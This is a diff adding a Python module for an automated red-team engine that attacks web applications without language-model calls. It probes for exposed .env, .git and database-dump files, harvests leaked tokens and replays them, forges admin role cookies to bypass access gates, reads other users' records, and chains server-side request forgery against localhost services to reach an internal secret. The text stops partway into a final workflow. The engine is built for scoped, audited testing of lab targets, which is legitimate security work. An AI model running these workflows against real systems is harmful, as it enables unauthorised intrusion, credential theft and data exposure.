@@ -1,0 +1,904 @@
+"""The deterministic offensive engine — skills compiled to executable workflows.
+
+Every arm that attacks a target today (raw, flat, swarm) waits on a language
+model before a single offensive step happens. The tools exist, the skills are
+declared in hands.py, the trust matrix and proof pipeline exist — but nothing
+EXECUTES the declared offense as code. This module is that missing piece:
+
+  - Each Skill declared in redteam/hands.py gets a workflow here: the same
+    entry evidence -> steps -> exit -> proof contract, implemented against the
+    registered tools (never raw requests), so scope, rate limits, audit,
+    traffic recording and the trust ladder hold exactly as for an LLM agent.
+  - The engine runs the orchestrator's round shape deterministically:
+    recon -> crosschecked leads -> class-specialist workflows -> verify pass
+    (the same FindingStore pending -> promote pipeline, executed by the
+    verify_finding_independently tool) -> ground-truth scoring via bench.
+  - Zero model calls. That makes it (a) the live-fire harness proving the
+    machine end-to-end, (b) the regression offense every new tool must pass
+    ("can the machinery alone find the planted bug?"), and (c) callable
+    fallback workflows the LLM specialists can invoke step-by-step when
+    improvisation stalls.
+
+Honesty rules carried over unchanged:
+  - Leads are NEVER findings. Every lead passes crosscheck_lead (its matrix
+    second method) before a workflow spends proof budget on it.
+  - Proof = the tools' k-of-n reproduction with negative control; the verdict
+    belongs to the pipeline (pending_verification), confirmed only by the
+    independent verify pass.
+  - Credentials come from the RoE (engagement "credentials" block, seeded lab
+    accounts) or from harvest (extract_secrets over material the run itself
+    obtained, registered via try_credential). Nothing is invented.
+
+    python -m redteam.offensive --engagement runs/x/engagement.yaml \
+        --base-url http://127.0.0.1:8894 --out runs/x/offensive
+"""
+
+from __future__ import annotations
+
+import json
+import re
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Callable
+
+from .config import Engagement, load_engagement
+from .tools import Tool, ToolContext, build_registry
+from .tools.http import fetch_once
+
+
+# ----------------------------------------------------------------------------
+# Leads — first-class, crosschecked before use
+# ----------------------------------------------------------------------------
+
+@dataclass
+class Lead:
+    """A recon claim. Never trusted until its trust class says so:
+    'tool-claim' needs the matrix second method (crosscheck_lead);
+    'first-party' is material this engine fetched and read ITSELF — the
+    observation IS the evidence, same as http_probe's."""
+    kind: str            # path | param | doc | host | token
+    url: str = ""
+    param: str = ""
+    method: str = "GET"
+    source_tool: str = ""
+    claim: str = ""
+    trust: str = "tool-claim"            # first-party | tool-claim
+    crosscheck: str = "uncorroborated"   # -> corroborated | exempt | first-party
+    note: str = ""
+
+    def believed(self) -> bool:
+        return self.crosscheck in {"corroborated", "exempt", "first-party"}
+
+
+def _parse_json_loose(text: str):
+    try:
+        return json.loads(text)
+    except (json.JSONDecodeError, TypeError):
+        return None
+
+
+# ----------------------------------------------------------------------------
+# The engine
+# ----------------------------------------------------------------------------
+
+class OffensiveEngine:
+    """Round-shaped, model-free execution of the declared offense."""
+
+    def __init__(self, engagement: Engagement, tools: dict[str, Tool] | None = None,
+                 ctx: ToolContext | None = None, creds: dict | None = None,
+                 max_rounds: int = 3, log: Callable[..., None] = print):
+        self._eng = engagement
+        self._tools = tools if tools is not None else build_registry(
+            enable_sandbox=False, enable_browser=False)
+        self._ctx = ctx
+        self._creds = creds or (engagement.raw.get("credentials") or {})
+        self._max_rounds = max_rounds
+        self._log = log
+        self._leads: list[Lead] = []
+        self._base: str = ""
+        self.rounds: list[dict] = []
+
+    # -- plumbing -------------------------------------------------------------
+
+    def _tool(self, name: str) -> Tool:
+        t = self._tools.get(name)
+        if t is None:
+            raise RuntimeError(f"offensive engine requires tool '{name}' "
+                               f"(not in registry: {sorted(self._tools)[:8]}...)")
+        return t
+
+    def _run_tool(self, name: str, **kwargs) -> dict:
+        """Run a registered tool; parse its JSON result. Non-JSON results
+        (BLOCKED/ERROR) become {'ok': False, 'note': <text>}."""
+        raw = self._tool(name).run(self._ctx, **kwargs)
+        out = _parse_json_loose(raw) if isinstance(raw, str) and raw.startswith("{") else None
+        if out is None:
+            return {"ok": False, "note": raw if isinstance(raw, str) else str(raw)}
+        return out
+
+    def _fetch(self, req: dict, tool: str = "offensive") -> tuple[int, str]:
+        status, body, _elapsed, _hdrs = fetch_once(self._ctx, req, tool=tool)
+        return status, body
+
+    def _preobserve(self, req: dict) -> tuple[int, str]:
+        """Cheap single-shot triage of a payload/branch BEFORE spending the
+        proof pipeline's k-of-n budget: the conditions we hand verify_vulnerability
+        use the OBSERVED status, never an assumed one."""
+        return self._fetch(req, tool="offensive.triage")
+
+    def _audit(self, event: str, **fields) -> None:
+        self._ctx.audit.record(event, **fields)
+
+    def _resolve_raw(self, preview: str) -> str:
+        """extract_secrets stores candidates MASKED (the transcript never holds
+        raw secrets); the raw value lives in the engine's own access graph. This
+        resolves a candidate preview exactly the way try_credential does."""
+        from .access import CREDENTIAL
+        node = self._ctx.access and self._ctx.access._nodes.get(
+            f"{CREDENTIAL}:{preview}")
+        return (node.attrs.get("value") or "") if node else ""
+
+    def _crosscheck(self, lead: Lead) -> bool:
+        """Second method or it doesn't count. Exempt classes pass as-is."""
+        res = self._run_tool("crosscheck_lead", tool=lead.source_tool or lead.kind,
+                             claim=lead.claim or f"{lead.kind} {lead.url}",
+                             url=lead.url, param=lead.param)
+        lead.crosscheck = str(res.get("verdict", "unverifiable"))
+        self._audit("offensive.lead.crosschecked", kind=lead.kind, url=lead.url,
+                    verdict=lead.crosscheck)
+        return lead.crosscheck in {"corroborated", "exempt"}
+
+    # -- entry ----------------------------------------------------------------
+
+    def run(self, objective_text: str = "") -> dict:
+        t0 = time.time()
+        base = getattr(self, "_base_override", "")
+        if not base:
+            raise RuntimeError("no base URL: the caller pins the target explicitly "
+                               "(engine._base_override / --base-url)")
+        self._base = base.rstrip("/")
+        self._audit("offensive.run.start", base=self._base, creds=sorted(self._creds))
+
+        summary: dict = {"base": self._base, "rounds": [], "leads": 0,
+                         "crosschecked": 0, "findings": 0, "pending": 0,
+                         "confirmed": 0}
+        for rnd in range(1, self._max_rounds + 1):
+            rlog: dict = {"round": rnd}
+            if rnd == 1:
+                rlog["recon"] = self._round_recon()
+                rlog["workflows"] = self._round_exploit()
+            else:
+                # Later rounds: workflows already fired; the round is the
+                # pipeline's verdict over whatever is still pending.
+                rlog["verify"] = self._verify_pass()
+            if "verify" not in rlog:
+                rlog["verify"] = self._verify_pass()
+            summary["rounds"].append(rlog)
+            obj = self._eng.objective
+            if obj is not None and getattr(obj, "achieved", False):
+                rlog["objective"] = "achieved"
+                break
+            if not self._ctx.findings.pending():
+                rlog["halt"] = "nothing pending — pipeline has ruled"
+                break
+        fstore = self._ctx.findings
+        summary["leads"] = len(self._leads)
+        summary["crosschecked"] = sum(1 for l in self._leads if l.crosscheck == "corroborated")
+        summary["findings"] = len(fstore.all())
+        summary["pending"] = len(fstore.pending())
+        summary["confirmed"] = sum(1 for f in fstore.all()
+                                   if f.confidence == "confirmed")
+        summary["elapsed_s"] = round(time.time() - t0, 1)
+        self._audit("offensive.run.done", **{k: v for k, v in summary.items()
+                                             if k != "rounds"})
+        return summary
+
+    # -- ROUND 1a: recon (surface -> crawl/discover -> docs -> params) ---------
+
+    def _round_recon(self) -> dict:
+        out: dict = {"surface": [], "paths": [], "params": [], "docs": [],
+                     "app_name": ""}
+        # 1. what is alive (ground-truth class: reads the RoE allowlist itself)
+        scan = self._run_tool("surface_scan")
+        alive = scan.get("alive", []) if scan.get("ok", True) else []
+        out["surface"] = alive
+        self._audit("offensive.recon.surface", alive=alive)
+
+        # 2. wrapped-binary claims (ffuf/katana/arjun classes): leads from these
+        #    are tool-claims and MUST crosscheck. They may be unavailable
+        #    (no sandbox) — recon then rests entirely on first-party reads.
+        for tool, kw in (("crawl", {"depth": 2}),
+                         ("content_discovery", {"wordlist": "common"})):
+            res = self._run_tool(tool, target=self._base, reason="map the surface",
+                                 **kw)
+            for lead in res.get("leads", []):
+                url = lead.get("url") or ""
+                if not url:
+                    continue
+                param = ""
+                if "?" in url:
+                    qs = url.split("?", 1)[1]
+                    param = qs.split("=", 1)[0] if "=" in qs else qs
+                self._leads.append(Lead(kind="path" if not param else "param",
+                                        url=url.split("?")[0], param=param,
+                                        method=lead.get("method", "GET"),
+                                        source_tool=tool, trust="tool-claim",
+                                        claim=f"{tool} saw {url}"))
+
+        # 3. FIRST-PARTY reads: this engine fetches and parses material itself.
+        #    (a) the landing page: links, form actions, and the app name
+        st, home = self._fetch({"method": "GET", "url": self._base + "/"},
+                               tool="http_probe")
+        app_name = ""
+        if st == 200 and home:
+            m = re.search(r"<title[^>]*>([^<]{2,64})</title>", home, re.I)
+            if m:
+                app_name = m.group(1).strip()
+                out["app_name"] = app_name
+                self._app_name = app_name
+            for href in re.findall(r"""(?:href|action)=["']([^"'#\s]{1,200})["']""",
+                                   home):
+                path = href.split("?")[0]
+                if path.startswith("/") and not path.startswith("//"):
+                    self._leads.append(Lead(kind="path", url=path,
+                                            source_tool="homepage",
+                                            trust="first-party",
+                                            claim=f"linked from /: {path}",
+                                            note=href))
+                if "?" in href and href.startswith("/"):
+                    qs = href.split("?", 1)[1]
+                    for p in [x.split("=")[0] for x in qs.split("&") if x]:
+                        self._leads.append(Lead(kind="param", url=path, param=p,
+                                                source_tool="homepage",
+                                                trust="first-party",
+                                                claim=f"form param {p} on {path}"))
+        #    (b) a bounded high-yield path probe (my own observations, capped)
+        for path in ("/robots.txt", "/openapi.json", "/swagger.json", "/sitemap.xml",
+                     "/docs", "/api", "/api/", "/admin", "/admin/", "/login",
+                     "/debug/", "/backup/", "/actuator", "/server-status",
+                     "/.env", "/.git/HEAD", "/.env.bak", "/config.json"):
+            st, body = self._fetch({"method": "GET", "url": self._base + path},
+                                   tool="http_probe")
+            if st == 200 and (body or "").strip():
+                self._leads.append(Lead(kind="path", url=path,
+                                        source_tool="path-probe",
+                                        trust="first-party",
+                                        claim=f"GET {path} -> 200 ({len(body)}b)",
+                                        note=body[:2000]))
+        # 4. deterministic doc parsing (openapi paths+params, robots disallows)
+        for lead in [l for l in self._leads if l.source_tool == "path-probe"]:
+            if re.search(r"\.json$|swagger", lead.url):
+                doc = _parse_json_loose(lead.note) or \
+                    _parse_json_loose(self._fetch({"method": "GET",
+                                                   "url": self._base + lead.url},
+                                                  tool="http_probe")[1])
+                if isinstance(doc, dict) and doc.get("paths"):
+                    for p, spec in doc["paths"].items():
+                        for m in ("get", "post", "put", "delete", "patch"):
+                            if m in (spec or {}):
+                                self._leads.append(Lead(
+                                    kind="path", url=p, method=m.upper(),
+                                    source_tool="openapi", trust="first-party",
+                                    claim=f"documented {m.upper()} {p}",
+                                    note=json.dumps(spec[m])[:2000]))
+                        if isinstance(spec, dict) and "parameters" in spec:
+                            for prm in spec["parameters"]:
+                                self._leads.append(Lead(
+                                    kind="param", url=p, param=prm.get("name", ""),
+                                    source_tool="openapi", trust="first-party",
+                                    claim=f"documented param {prm.get('name')}"))
+            elif lead.url == "/robots.txt":
+                for line in lead.note.splitlines():
+                    if line.lower().startswith("disallow:"):
+                        self._leads.append(Lead(
+                            kind="path", url=line.split(":", 1)[1].strip(),
+                            source_tool="robots", trust="first-party",
+                            claim=f"robots disallows {line.strip()}"))
+        # 5. arjun-class param discovery on the base (tool-claim, bounded)
+        res = self._run_tool("param_discovery", target=self._base,
+                             reason="find hidden parameters")
+        for p in res.get("leads", []):
+            name = p.get("param", "") if isinstance(p, dict) else str(p)
+            if name:
+                self._leads.append(Lead(kind="param", url="/", param=name,
+                                        source_tool="param_discovery",
+                                        claim=f"hidden param {name}"))
+        # 6. trust discipline: tool-claims pass the matrix second method;
+        #    first-party observations stand on their own fetch.
+        kept = []
+        for lead in self._leads:
+            ok = (self._crosscheck(lead) if lead.trust == "tool-claim"
+                  else self._mark_first_party(lead))
+            if ok:
+                kept.append(lead)
+        self._leads = kept
+        paths = sorted({l.url for l in self._leads
+                        if l.kind == "path" and l.url and l.believed()})
+        params = sorted({(l.url, l.param) for l in self._leads
+                         if l.kind == "param" and l.param and l.believed()})
+        out["paths"], out["params"] = paths, [list(p) for p in params]
+        return out
+
+    def _mark_first_party(self, lead: Lead) -> bool:
+        lead.crosscheck = "first-party"
+        return True
+
+    # -- ROUND 1b: class workflows (hands.py Skills, executable) --------------
+
+    def _round_exploit(self, round: int = 1) -> list[str]:
+        done = []
+        # a05: doc/config leak hunt (openapi descriptions, robots-nudged paths)
+        if self._workflow_doc_leak():
+            done.append("doc-leak-hunt")
+        # a05: backup/dump hunt over discovered backup-ish paths
+        if self._workflow_backup_hunt():
+            done.append("backup-hunt")
+        # a07/a01: principals from RoE creds, then the access differential
+        if self._workflow_auth_map():
+            done.append("auth-boundary-map")
+        if self._workflow_access_differential():
+            done.append("idor-differential")
+        # a10: SSRF via url-bearing endpoints, chained on harvested tokens
+        if self._workflow_ssrf():
+            done.append("ssrf-callback-map")
+        # a03: deterministic reflection map -> READY check_spec -> prove
+        if self._workflow_reflect_prove():
+            done.append("reflect-map-prove")
+        self._audit("offensive.workflows.done", round=round, ran=done)
+        return done
+
+    # ---- workflow: doc/config leak (a05 exposure-hunt) ----------------------
+
+    def _doc_like_paths(self) -> list[Lead]:
+        return [l for l in self._leads
+                if re.search(r"openapi|swagger|\.json$|robots|debug|env|config",
+                             l.url or "")]
+
+    def _workflow_doc_leak(self) -> bool:
+        hit = False
+        for lead in self._doc_like_paths():
+            url = self._base + lead.url if lead.url.startswith("/") else lead.url
+            status, body = self._fetch({"method": "GET", "url": url},
+                                       tool="http_probe")
+            if status != 200 or not body:
+                continue
+            # harvest candidates from OUR OWN fetched material (offline-parse)
+            res = self._run_tool("extract_secrets", text=body[:20000],
+                                 context=f"doc:{lead.url}")
+            cands = [c for c in res.get("candidates", [])
+                     if c.get("confidence") in {"high", "medium"}]
+            if not cands:
+                continue
+            # a leaked token only matters if it AUTHENTICATES. try_credential is
+            # GET-only; when the probe is a POST endpoint we validate with a direct
+            # fetch (benign mirror URL) and register the session ourselves.
+            probe = next((l for l in self._leads if l.method == "POST"
+                          and re.search(r"import|fetch|url|upload", l.url or "")), None)
+            if probe is None:
+                continue
+            probe_path = probe.url if probe.url.startswith("/") else "/" + probe.url
+            probe_url = self._base + probe_path
+            for c in cands[:3]:
+                token = self._resolve_raw((c.get("preview") or "").strip()) \
+                    or (c.get("preview") or "").strip()
+                if not re.fullmatch(r"[\w\-.]{8,64}", token):
+                    continue
+                hdrs = {"Authorization": f"Bearer {token}"}
+                status, resp_body = self._fetch(
+                    {"method": "POST", "url": probe_url, "headers": hdrs,
+                     "body": json.dumps({"url": self._base + "/"})},
+                    tool="try_credential")
+                if status != 200:
+                    continue
+                self._ctx.sessions.set("harvest", hdrs)
+                self._audit("offensive.harvest.registered", context=lead.url,
+                            kind=c.get("kind"))
+                # disclosure finding: the doc/env leak itself, negative control =
+                # a random sibling path (must NOT leak)
+                ctrl = {"method": "GET",
+                        "url": self._base + f"/no-such-{int(time.time())}"}
+                payload = {"method": "GET", "url": url}
+                res_v = self._run_tool(
+                    "verify_vulnerability",
+                    title=f"Sensitive token disclosure at {lead.url}",
+                    severity="high", target=lead.url,
+                    summary=f"{lead.url} serves material containing a live "
+                            f"credential ({c.get('kind')}); replayed with the "
+                            f"harvested token against {probe.url} -> 200.",
+                    requests={"payload": payload, "control": ctrl},
+                    conditions=[{"type": "status", "request": "payload",
+                                 "equals": 200},
+                                {"type": "body_regex", "request": "payload",
+                                 "pattern": re.escape(token), "present": True}],
+                    negative_control=ctrl,
+                    cwe="CWE-200",
+                    recommendation="Strip credentials from generated docs and "
+                                   "debug endpoints; require auth for /debug.")
+                if res_v.get("recorded"):
+                    hit = True
+                break
+        return hit
+
+    # ---- workflow: backup/dump hunt (a05) ------------------------------------
+
+    def _workflow_backup_hunt(self) -> bool:
+        hit = False
+        # app-name conventions (the real-world backup naming scheme): prefer the
+        # landing page's own <title>, fall back to the host label
+        name_src = (getattr(self, "_app_name", "") or
+                    self._base.split("//")[-1].split(":")[0].split("/")[0])
+        host = re.sub(r"[^a-z0-9]", "", name_src.lower()) or "app"
+        conventions = [f"{host}-2023.sql", f"{host}-2024.sql", f"{host}-2025.sql",
+                       f"{host}-2026.sql", "db.sql", "dump.sql", "backup.sql",
+                       f"{host}.sql", f"{host}.zip", f"{host}.tar.gz"]
+        for lead in [l for l in self._leads if re.search(
+                r"backup|dump|\.sql|\.zip|\.tar|\.bak", l.url or "")]:
+            dirurl = lead.url if lead.url.startswith("/") else "/" + lead.url
+            candidates = [dirurl] if re.search(r"\.(sql|zip|tar|gz|bak)$", dirurl) \
+                else [dirurl.rstrip("/") + "/" + name for name in conventions]
+            for cand in candidates:
+                url = self._base + cand
+                st, body = self._preobserve({"method": "GET", "url": url})
+                if st != 200 or len(body) < 64:
+                    continue
+                if not re.search(r"CREATE TABLE|INSERT INTO|-- MySQL|"
+                                 "-- PostgreSQL", body[:4000]):
+                    continue
+                ctrl = {"method": "GET",
+                        "url": self._base + f"/no-such-{int(time.time())}"}
+                st_c, _ = self._preobserve(ctrl)
+                res_v = self._run_tool(
+                    "verify_vulnerability",
+                    title=f"Exposed database dump at {cand}",
+                    severity="high", target=cand,
+                    summary=f"{cand} serves a SQL dump unauthenticated "
+                            f"({len(body)} bytes, CREATE TABLE observed); a "
+                            f"random sibling path is {st_c}.",
+                    requests={"payload": {"method": "GET", "url": url},
+                              "control": ctrl},
+                    conditions=[{"type": "status", "request": "payload",
+                                 "equals": 200},
+                                {"type": "body_regex", "request": "payload",
+                                 "pattern": "CREATE TABLE|INSERT INTO",
+                                 "present": True},
+                                {"type": "status", "request": "control",
+                                 "equals": st_c}],
+                    negative_control=ctrl, cwe="CWE-200",
+                    recommendation="Remove dumps from the webroot; deny listing.")
+                if res_v.get("recorded"):
+                    hit = True
+        return hit
+
+    # ---- workflow: auth boundary map (a07/a01) -------------------------------
+
+    def _login_lead(self) -> Lead | None:
+        return next((l for l in self._leads
+                     if "login" in (l.url or "").lower()
+                     or "auth" in (l.url or "").lower()), None)
+
+    def _workflow_auth_map(self) -> bool:
+        if not self._creds:
+            return False
+        login = self._login_lead()
+        for label, pack in sorted(self._creds.items()):
+            if pack.get("token"):
+                self._run_tool("set_session", label=label,
+                               headers={"Authorization": f"Bearer {pack['token']}"},
+                               note="RoE-seeded principal")
+                continue
+            if login is None or not pack.get("password"):
+                continue
+            url = self._base + login.url if login.url.startswith("/") else login.url
+            body = json.dumps({"user": label, "password": pack["password"]})
+            res = self._run_tool("authenticate", label=label, url=url,
+                                 method=login.method or "POST", body=body,
+                                 token_json_path=pack.get("token_field", "token"))
+            self._audit("offensive.principal", label=label, ok=res.get("ok"))
+        return any(self._ctx.sessions and self._ctx.sessions.get(label)
+                   for label in self._creds)
+
+    # ---- workflow: two-principal access differential (a01) -------------------
+
+    def _gated_leads(self) -> list[Lead]:
+        return [l for l in self._leads
+                if re.search(r"admin|export|user|pm|message|private|internal",
+                             (l.url or "").lower())]
+
+    def _workflow_access_differential(self) -> bool:
+        principals = [l for l in sorted(self._creds)
+                      if self._ctx.sessions and self._ctx.sessions.get(l)]
+        if len(principals) < 2:
+            return False
+        # low = a NON-admin principal when one exists (an admin token passes the
+        # gate without forgery, which would make the control reproduce)
+        low = next((p for p in principals
+                    if not re.search(r"admin|root|super|owner", p)), principals[0])
+        hit = False
+        # Explicit headers, NOT session_label: authenticate stores the login's
+        # Set-Cookie in the session, and session headers WIN on merge — a forged
+        # Cookie in the request would be silently overwritten. We read OUR OWN
+        # captured bearer and build the two identities by hand.
+        low_hdrs = dict(self._ctx.sessions.get(low).headers)
+        others = [p for p in principals if p != low]
+        for lead in self._gated_leads():
+            path = lead.url if lead.url.startswith("/") else "/" + lead.url
+            # 1) baseline: the gate must actually deny before forgery means anything
+            st_un, body_un = self._fetch({"method": lead.method, "url": self._base + path},
+                                         tool="http_probe")
+            if st_un not in (401, 403, 404):
+                continue  # wide open (different class) or not a gate
+            # resolve the resource parameter the gate guards (user/owner/id=...)
+            target_user = next((o for o in others
+                                if not re.search(r"admin|root|super", o)), None)
+            probe_path = path
+            if re.search(r"[?&](user|owner|account|id)=", path) is None:
+                if target_user:
+                    probe_path = f"{path}{'&' if '?' in path else '?'}user={target_user}"
+                else:
+                    continue  # no resolvable resource -> nothing to own
+            # 2) role-cookie forgery (CWE-284): the gate trusting a client cookie.
+            #    Isolation: ask for the LOW principal's OWN record — ownership is
+            #    irrelevant here, only the gate's trust decision is under test.
+            own_user = re.search(r"(user|owner|account|id)=([^&]+)", probe_path)
+            own_path = re.sub(r"(user|owner|account|id)=[^&]+",
+                              rf"\g<1>={low}", probe_path) if own_user else probe_path
+            for variant in ("role=admin", "role=administrator", "admin=1",
+                            "is_admin=true"):
+                payload = {"method": lead.method, "url": self._base + own_path,
+                           "headers": {**low_hdrs, "Cookie": variant}}
+                control = {"method": lead.method, "url": self._base + own_path,
+                           "headers": dict(low_hdrs)}
+                st_p, _ = self._preobserve(payload)
+                if st_p != 200:
+                    continue  # this forgery variant does not pass the gate
+                st_c, _ = self._preobserve(control)
+                if st_c == 200:
+                    continue  # control reproduces: the gate never mattered
+                res_v = self._run_tool(
+                    "verify_vulnerability",
+                    title=f"Client-controlled role cookie bypasses the admin gate "
+                          f"({path})",
+                    severity="high", target=path,
+                    summary=f"{path} denies the authenticated low-privilege "
+                            f"principal ({st_c} without cookie) but accepts the "
+                            f"same token with client-supplied Cookie '{variant}' "
+                            f"— authorization derived from client state "
+                            f"(CWE-284).",
+                    requests={"payload": payload, "control": control},
+                    conditions=[{"type": "status", "request": "payload",
+                                 "equals": 200},
+                                {"type": "status", "request": "control",
+                                 "equals": st_c}],
+                    negative_control=control, cwe="CWE-284",
+                    recommendation="Derive authorization from the token, never "
+                                   "from client-supplied cookies/headers.")
+                if res_v.get("recorded"):
+                    hit = True
+                    break
+            # 3) cross-principal object access (CWE-639): low principal +
+            #    the (now known-trusted) forged cookie reading ANOTHER
+            #    principal's record; control = same request WITHOUT the forgery.
+            if target_user:
+                idor_path = re.sub(r"(user|owner|account|id)=[^&]+",
+                                   rf"\g<1>={target_user}", probe_path)
+                payload = {"method": lead.method, "url": self._base + idor_path,
+                           "headers": {**low_hdrs, "Cookie": "role=admin"}}
+                control = {"method": lead.method, "url": self._base + idor_path,
+                           "headers": dict(low_hdrs)}
+                st_p, body_p = self._preobserve(payload)
+                st_c, _ = self._preobserve(control)
+                if st_p != 200 or st_c == 200:
+                    continue
+                # The payload must carry the OTHER principal's material, not
+                # merely any 200. Reference body: an admin principal (the
+                # legitimate cross-user reader) when one exists — an admin-gated
+                # export denies its own owner too, so the owner's session often
+                # CANNOT serve as the reference; owner-session is the fallback
+                # for owner-readable resources.
+                ref_label = next((p for p in principals
+                                  if re.search(r"admin", p)), target_user)
+                ref_hdrs = dict(self._ctx.sessions.get(ref_label).headers)
+                st_b, body_b = self._preobserve(
+                    {"method": lead.method, "url": self._base + idor_path,
+                     "headers": ref_hdrs})
+                own_body = self._fetch({"method": lead.method,
+                                        "url": self._base + idor_path,
+                                        "headers": dict(low_hdrs)},
+                                       tool="offensive.triage")[1]
+                distinctive = [t for t in dict.fromkeys(
+                    re.findall(r"[\w\-]{10,}", body_b or ""))
+                    if t not in (own_body or "")][:3]
+                if not distinctive:
+                    continue
+                marker = distinctive[0]
+                if marker not in (body_p or ""):
+                    continue
+                res_v = self._run_tool(
+                    "verify_vulnerability",
+                    title=f"Cross-principal object access without ownership "
+                          f"check ({idor_path})",
+                    severity="critical", target=idor_path,
+                    summary=f"Principal '{low}' retrieves '{target_user}''s "
+                            f"record via {idor_path}: the response carries "
+                            f"material ('{marker[:8]}...') that exists only in "
+                            f"'{target_user}''s own view; the same request "
+                            f"without the client-trusted role cookie is denied "
+                            f"({st_c}) — the object owner is never checked "
+                            f"(CWE-639).",
+                    requests={"payload": payload, "control": control},
+                    conditions=[{"type": "status", "request": "payload",
+                                 "equals": 200},
+                                {"type": "body_regex", "request": "payload",
+                                 "pattern": re.escape(marker),
+                                 "present": True},
+                                {"type": "status", "request": "control",
+                                 "equals": st_c}],
+                    negative_control=control, cwe="CWE-639",
+                    recommendation="Enforce object-level authorization against "
+                                   "the authenticated principal on EVERY read.")
+                if res_v.get("recorded"):
+                    hit = True
+        return hit
+
+    # ---- workflow: SSRF chain (a10) -------------------------------------------
+
+    def _url_bearing_endpoints(self) -> list[Lead]:
+        out = []
+        for l in self._leads:
+            if l.method == "POST" and re.search(r"import|fetch|url|proxy|webhook",
+                                                (l.url or "").lower()):
+                out.append(l)
+            elif l.note and re.search(r'"url"|\burl\b.*(string|required)',
+                                      l.note):
+                out.append(l)
+        return out
+
+    def _workflow_ssrf(self) -> bool:
+        hit = False
+        ports = sorted({p for p in self._eng.allowed_ports if p not in (80, 443)})
+        hosts = ["127.0.0.1", "localhost"]
+        for lead in self._url_bearing_endpoints():
+            path = lead.url if lead.url.startswith("/") else "/" + lead.url
+            url = self._base + path
+            hdrs = {}
+            st, body = self._fetch({"method": "POST", "url": url, "body": "{}"},
+                                   tool="http_probe")
+            if st == 401 and self._ctx.sessions:
+                sess = self._ctx.sessions.get("harvest") or \
+                    next((self._ctx.sessions.get(k) for k in sorted(self._creds)
+                          if self._ctx.sessions.get(k)), None)
+                if not sess:
+                    continue
+                hdrs = dict(sess.headers)
+                st, body = self._fetch({"method": "POST", "url": url,
+                                        "headers": hdrs, "body": "{}"},
+                                       tool="http_probe")
+            if st not in (200, 400, 422, 500):
+                continue
+            for h in hosts:
+                for p in ports:
+                    internal = f"http://{h}:{p}/"
+                    payload = {"method": "POST", "url": url,
+                               "body": json.dumps({"url": internal}),
+                               "headers": hdrs}
+                    control = {"method": "POST", "url": url,
+                               "body": json.dumps({"url": f"http://{h}:{p+7777}/"}),
+                               "headers": hdrs}
+                    st_p, body_p = self._preobserve(payload)
+                    st_c, body_c = self._preobserve(control)
+                    if st_p >= 400 or (body_p or "").strip() == (body_c or "").strip():
+                        continue
+                    # distinctive internal material: something in the SSRF'd
+                    # response that the dead-port control cannot produce
+                    distinctive = [t for t in dict.fromkeys(
+                        re.findall(r"[\w\-]{8,}", body_p or ""))
+                        if t not in (body_c or "")][:3]
+                    if not distinctive:
+                        continue
+                    marker = distinctive[0]
+                    res_v = self._run_tool(
+                        "verify_vulnerability",
+                        title=f"Server-side request forgery via {path} reaches "
+                              f"internal service {h}:{p}",
+                        severity="critical", target=path,
+                        summary=f"{path} fetches a caller-supplied URL from the "
+                                f"server: pointing it at {internal} returns the "
+                                f"INTERNAL service's own response (marker "
+                                f"'{marker[:8]}...' absent from the dead-port "
+                                f"control) — no egress allowlist (CWE-918).",
+                        requests={"payload": payload, "control": control},
+                        conditions=[{"type": "body_regex", "request": "payload",
+                                     "pattern": re.escape(marker),
+                                     "present": True}],
+                        negative_control=control, cwe="CWE-918",
+                        recommendation="Allowlist egress destinations; deny "
+                                       "link-local and loopback targets.")
+                    if res_v.get("recorded"):
+                        hit = True
+                    # -- the chain: internal service banner -> token disclosure
+                    # -> authenticated internal secret. Each stage observed
+                    # before the pipeline is asked to reproduce it.
+                    tok = self._chase_internal_token()
+                    if tok:
+                        chain_url = f"http://{h}:{p}/internal/secret?token={tok}"
+                        chain_payload = {"method": "POST", "url": url,
+                                         "body": json.dumps({"url": chain_url}),
+                                         "headers": hdrs}
+                        st_cp, body_cp = self._preobserve(chain_payload)
+                        if st_p and "secret" in (body_cp or "").lower() \
+                                and distinctive:
+                            res_c = self._run_tool(
+                                "verify_vulnerability",
+                                title=f"SSRF chain: {path} -> internal secret "
+                                      f"(token harvested from a disclosure)",
+                                severity="critical", target=path,
+                                summary=f"Chained: a disclosure harvested an "
+                                        f"internal token; {path} fetched "
+                                        f"{chain_url} with it and returned the "
+                                        f"internal secret object.",
+                                requests={"payload": chain_payload,
+                                          "control": control},
+                                conditions=[
+                                    {"type": "body_regex", "request": "payload",
+                                     "pattern": "secret|FLAG\\{",
+                                     "present": True}],
+                                negative_control=control, cwe="CWE-918",
+                                recommendation="Egress allowlist + rotate the "
+                                               "leaked internal token.")
+                            if res_c.get("recorded"):
+                                hit = True
+        return hit
+
+    def _chase_internal_token(self) -> str:
+        """Look at disclosure-ish leads for an internal token we have NOT yet
+        registered; harvest material only from responses WE obtained."""
+        for lead in self._doc_like_paths():
+            if not re.search(r"debug|env|secret|internal", lead.url or ""):
+                continue
+            url = self._base + lead.url if lead.url.startswith("/") else lead.url
+            st, body = self._fetch({"method": "GET", "url": url},
+                                   tool="http_probe")
+            if st != 200 or not body:
+                continue
+            sec = self._run_tool("extract_secrets", text=body[:20000],
+                                 context=f"chain:{lead.url}")
+            for c in sec.get("candidates", []):
+                tok = self._resolve_raw((c.get("preview") or "").strip()) \
+                    or (c.get("preview") or "").strip()
+                if re.fullmatch(r"[\w\-.]{8,64}", tok) and \
+                        not self._ctx.sessions.get("internal"):
+                    # record the disclosure as its OWN finding (the token in a
+                    # debug/env body is CWE-200 regardless of the chain)
+                    ctrl = {"method": "GET",
+                            "url": self._base + f"/no-such-{int(time.time())}"}
+                    self._run_tool(
+                        "verify_vulnerability",
+                        title=f"Internal token disclosed at {lead.url}",
+                        severity="high", target=lead.url,
+                        summary=f"{lead.url} serves an internal credential "
+                                f"({c.get('kind')}) to unauthenticated callers; "
+                                f"used to authenticate to the internal service "
+                                f"in the SSRF chain.",
+                        requests={"payload": {"method": "GET", "url": url},
+                                  "control": ctrl},
+                        conditions=[{"type": "status", "request": "payload",
+                                     "equals": 200},
+                                    {"type": "body_regex", "request": "payload",
+                                     "pattern": re.escape(tok), "present": True}],
+                        negative_control=ctrl, cwe="CWE-200",
+                        recommendation="Require auth for debug endpoints; rotate "
+                                       "the exposed token.")
+                    self._ctx.sessions.set("internal",
+                                           {"X-Internal-Token": tok})
+                    return tok
+        return ""
+
+    # ---- workflow: reflect-map-prove (a03) ------------------------------------
+
+    def _workflow_reflect_prove(self) -> bool:
+        hit = False
